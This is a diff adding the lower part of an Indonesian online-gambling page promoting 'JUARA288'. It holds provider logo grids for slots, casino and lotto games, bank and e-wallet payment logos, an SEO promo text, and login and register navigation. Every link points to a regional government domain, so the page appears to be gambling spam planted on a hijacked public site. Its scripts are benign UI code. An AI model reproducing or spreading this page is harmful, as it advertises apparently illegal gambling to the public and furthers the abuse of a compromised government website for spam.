+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1201" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo_zeus.png" 
+			            		alt="logo HG5" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1202" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%205g.png" 
+			            		alt="logo 5G" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1203" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo_playtech.svg" 
+			            		alt="logo Playtech" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1211" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo_pop.png" 
+			            		alt="logo Fat Panda" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1221" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo_ggsoft.png" 
+			            		alt="logo GG Soft" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1222" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo_uglotto.png" 
+			            		alt="logo UG Lotto" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2001" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20sbobet.png" 
+			            		alt="logo SBO Bet" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2002" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20cq9.png" 
+			            		alt="logo CQ Nine" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2005" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20biggaming.png" 
+			            		alt="logo Big Gaming" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2007" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20sexygaming.png" 
+			            		alt="logo Sexy Baccarat" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2010" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20joker.png" 
+			            		alt="logo Joker Gaming" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2012" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20ioncasino.png" 
+			            		alt="logo ION Casino" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2013" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20worldmatch.png" 
+			            		alt="logo World Match" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2016" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20funkygames.png" 
+			            		alt="logo Funky Games" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2019" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20sagaming.png" 
+			            		alt="logo SA Gaming" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2028" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20allbet.png" 
+			            		alt="logo All Bet" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2029" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20microgaming.png" 
+			            		alt="logo Microgaming" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=2044" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20saba.png" 
+			            		alt="logo SABA Sport" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=201010" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20ygr.png" 
+			            		alt="logo You Get Rich" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	            	</div>
+    </div>
+
+
+    <!-- online banks -->
+    <div class="my-5">
+    	<h3 class="text-center">Cara Pembayaran</h3>
+    	<div class="row g-1">
+    		<div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/BCA.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/Mandiri.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/BNI.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/BRI.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/cimb.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/danamon.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/permata.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/panin.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/mega.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/btn.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/neobank.jpg" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/jago.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/seabank.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/allobank.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/Gopay.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/ovo.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/DANA.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/shopeepay.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/LINKAJA.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/sakuku.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/jenius.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/telkomsel.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/xl.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/tri.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/axis.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div><div class="col-4 col-md-3 col-lg-2 text-center"><div class="py-3 rounded-3 glassmorphism" ><img src="https://fffiiillleee.com/open-img-pub/named-panel/banks/qris-b.png" height="30" style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)" alt="Bank Logo" ></div></div>    		
+    	</div>
+    </div>
+
+
+    <!-- social link -->
+    <div class="my-5 p-3 rounded-3 glassmorphism">
+    	<h3 class="text-center">
+			Temui Kami		</h3>
+    	<div class="d-flex justify-content-center gap-3" style="font-size:2em">
+    		    	</div>
+    </div>
+
+
+    <!-- articles -->
+    
+
+
+	<!-- long tail -->
+	<div id="longtail-content"><h1>JUARA288 - Portal Akses Play Game Mobile Digital Terbaru</h1>
+
+<p><strong><a href="https://juara288-mu.com/">JUARA288</a></strong> hadir sebagai portal akses play game mobile digital terbaru yang memberikan penyediaan pengalaman bermain game mobile digital dengan system teknology canggih, kestabilan akses bermain, serta informasi cara bermain game movile digital.</p>
+
+<h2>Mengenal JUARA288 sebagai Portal Game Mobile Digital</h2>
+
+<p>JUARA288 merupakan portal yang mengangkat konsep hiburan game mobile digital dengan dukungan teknologi modern. Melalui tampilan yang dirancang sederhana dan navigasi yang mudah dipahami, JUARA288 memberikan kemudahan bagi pengunjung dalam mencari informasi mengenai berbagai pilihan permainan digital.</p>
+
+<p>Sebagai portal informasi game mobile, JUARA288 berfokus pada penyajian konten yang relevan dengan perkembangan teknologi permainan masa kini. Pengunjung dapat mengenal berbagai kategori permainan, memahami fitur yang tersedia, serta memperoleh gambaran mengenai cara menggunakan platform hiburan digital secara lebih bijak.</p>
+
+<h2>Teknologi Modern dalam Perkembangan Play Game Mobile</h2>
+
+<p>Teknologi menjadi salah satu faktor penting dalam perkembangan industri game mobile digital. Berbagai inovasi terus dikembangkan untuk menghadirkan tampilan permainan yang lebih menarik, responsif, dan mudah diakses melalui perangkat smartphone.</p>
+
+<p>JUARA288 mengangkat informasi seputar perkembangan teknologi tersebut, mulai dari sistem navigasi, kompatibilitas perangkat, hingga pengalaman penggunaan platform digital. Dengan memahami perkembangan teknologi mobile, pengguna dapat mengetahui berbagai aspek yang perlu diperhatikan sebelum memilih layanan hiburan online.</p>
+
+<h2>Keunggulan Informasi Portal JUARA288</h2>
+
+<p>Dalam perkembangan hiburan digital, informasi yang jelas dan mudah dipahami menjadi salah satu kebutuhan pengunjung. JUARA288 mengangkat sejumlah aspek yang berkaitan dengan kenyamanan penggunaan portal, di antaranya:</p>
+
+<ul>
+<li>Informasi Game Mobile: Mengenal berbagai perkembangan permainan berbasis perangkat mobile.</li>
+
+<li>Teknologi Digital: Mengikuti informasi mengenai inovasi dan sistem teknologi permainan.</li>
+
+<li>Navigasi Praktis: Memahami struktur akses yang dirancang agar mudah digunakan.</li>
+
+<li>Panduan Pengguna: Mendapatkan informasi dasar mengenai fitur dan cara menggunakan platform.</li>
+
+<li>Akses Multi Perangkat: Mengenal layanan digital yang dapat diakses melalui perangkat yang kompatibel.</li>
+</ul>
+
+<h2>Kesimpulan</h2>
+
+<p>JUARA288 merupakan portal akses play game mobile digital terbaru yang mengangkat informasi mengenai teknologi permainan modern, kemudahan navigasi, kestabilan akses, serta panduan penggunaan game mobile. Dengan penyajian informasi yang terstruktur dan mudah dipahami, JUARA288 menjadi salah satu referensi untuk mengenal perkembangan hiburan digital masa kini.</p>
+</div>	
+
+
+	
+</div>
+
+
+<footer class="footer">
+			Powered By <img src="https://fffiiillleee.com/open-img-pub/brands/HDC.png" class="footer-logo" alt="HDC">
+		</footer><style>
+			.footer {
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				justify-content: center;
+				padding: 15px 0;
+				font-size: 12px;
+			}
+
+			.footer-logo {
+				width: 50%;
+    			max-width: 80px;
+				height: auto;
+				display: block;
+				margin: 0 auto;
+				transition: filter 0.3s ease;
+			}
+
+			.footer p {
+				margin: 0;
+			}
+		</style><script>
+				function autoInvertLogo(selector) {
+					const element = document.querySelector(selector);
+					if (!element) return;
+					let bgColor = null;
+					let parent = element.parentElement;
+					while (parent && (!bgColor || bgColor === "rgba(0, 0, 0, 0)" || bgColor === "transparent")) {
+						bgColor = window.getComputedStyle(parent).backgroundColor;
+						parent = parent.parentElement;
+					}
+
+					if (!bgColor || bgColor === "rgba(0, 0, 0, 0)" || bgColor === "transparent") {
+						bgColor = "rgb(255,255,255)";
+					}
+
+					const match = bgColor.match(/\d+/g);
+					if (!match) return;
+					const [r, g, b] = match.map(Number);
+
+					const brightness = (r * 299 + g * 587 + b * 114) / 1000;
+
+					if (brightness < 200) {
+						element.style.filter = "brightness(0) invert(1)";
+					} else {
+						element.style.filter = "brightness(0) invert(0)";
+					}
+				}
+				
+				document.addEventListener("DOMContentLoaded", () => {
+					autoInvertLogo(".footer-logo");
+					const observer = new MutationObserver(() => autoInvertLogo(".footer-logo"));
+					observer.observe(document.body, { attributes: true, subtree: true });
+				});
+			</script>	
+					
+				</div>
+
+				
+<nav class="menubar navbar fixed-bottom navbar-dark bg-dark p-0" >
+        <div class="container"><div class="d-flex w-100">
+<div class="flex-grow-1 text-center align-middle pt-2 pb-1"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase" style="font-size:0.8em"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/home.png" height="36" alt="Home Icon" ><div>Home</div></a></div>
+<div class="flex-grow-1 text-center align-middle pt-2 pb-1"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase" style="font-size:0.8em"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/login.png" height="36" alt="Login Icon" ><div>Login</div></a></div>
+<div class="flex-grow-1 text-center align-middle pt-2 pb-1"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase" style="font-size:0.8em"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/register.png" height="36" alt="Register Icon" ><div>Daftar</div></a></div>
+<div class="flex-grow-1 text-center align-middle pt-2 pb-1"><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none text-white text-uppercase" style="font-size:0.8em"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/promo.png" height="36" alt="Promo Icon" ><div>Promosi</div></a></div>
+<div class="flex-grow-1 text-center align-middle pt-2 pb-1"><a href="https://old.data.bengkayangkab.go.id/" target="_blank" class="text-decoration-none text-white text-uppercase" style="font-size:0.8em"><img src="https://fffiiillleee.com/open-img-pub/hdc/category/chat.png" height="36" alt="Chat Icon" ><div>Live Chat</div></a></div></div></div>    
+</nav>
+
+				<!-- add footer space -->
+				<div style="height: 100px"></div>				
+			</div>
+		</div>
+
+		<!-- when sidebar active -->
+		<div class="overlay"></div>
+
+			
+
+<script>
+	const togglePass = document.getElementById('togglePass');
+	if (togglePass) {
+		togglePass.addEventListener('click', function () {
+			const pass = document.getElementById('pass');
+			const icon = this.querySelector('i');
+
+			if (!pass || !icon) return;
+
+			if (pass.type === 'password') {
+				pass.type = 'text';
+				icon.classList.remove('fa-eye');
+				icon.classList.add('fa-eye-slash');
+			} else {
+				pass.type = 'password';
+				icon.classList.remove('fa-eye-slash');
+				icon.classList.add('fa-eye');
+			}
+		});
+	}
+
+		$(document).ready(function(){
+			$("#carousel-togel").owlCarousel({
+				margin: 10,
+				autoWidth: true,
+                nav: false,
+                dots: false,
+				autoplay: true,
+				autoplayTimeout: 5000,
+				autoplayHoverPause: true,
+				loop: true,
+			});
+
+            $('.game-list-carousel').owlCarousel({
+                margin: 5,
+                autoWidth: true,
+                nav: false,
+                dots: false,
+                autoplay: false,
+                loop: true,
+            });
+
+			setInterval(updateTogelCountdownTimer, 500);
+		});
+
+		function updateTogelCountdownTimer() {
+			// console.log('updateTogelCountdownTimer');
+			$('.togel-countdown-timer').each(function(i) {
+				const time = $(this).data('time');
+				const status = $(this).data('status');
+				if (status === 0) {
+					$(this).text('TUTUP');
+					return;
+				}
+				if (status === 2) {
+					$(this).text('Masih Buka');
+					return;	
+				}
+				if (status === 1) {
+					// countdown timer
+					const now = Date.now();
+					const delta = parseInt(time) - now;					
+					if (delta < 0) {
+						$(this).text('TUTUP');
+						return;
+					} else {
+						// start from hour
+						let remain = delta;
+						const hour = parseInt(remain / 3600000);
+						remain -= hour * 3600000;
+						const minute = parseInt(remain / 60000);
+						remain -= minute * 60000;
+						const second = parseInt(remain / 1000);						
+						// console.log(delta, hour, minute, second);				
+						$(this).text(
+							('0'+hour).slice(-2) + 
+							' : ' + 
+							('0'+minute).slice(-2) + 
+							' : ' + 
+							('0'+second).slice(-2)
+						);
+						return;
+					}					
+				}
+			});
+		}	
+
+</script>
+	
+<style>
+#longtail-content img {
+	width: 100%;
+}
+		
+#longtail-content table {
+	width: 100%;
+	border-collapse: collapse;
+	margin: 1rem 0;
+	font-size: 0.95rem;
+}
+
+#longtail-content th,
+#longtail-content td {
+	border: 1px solid #dee2e6;
+	padding: 0.5rem;
+	text-align: left;
+	vertical-align: top;
+}
+</style>
+
+
+		<!-- chat script / code -->
+			<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"21429990fa7b45cf929ea53cdbc0cfc4","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
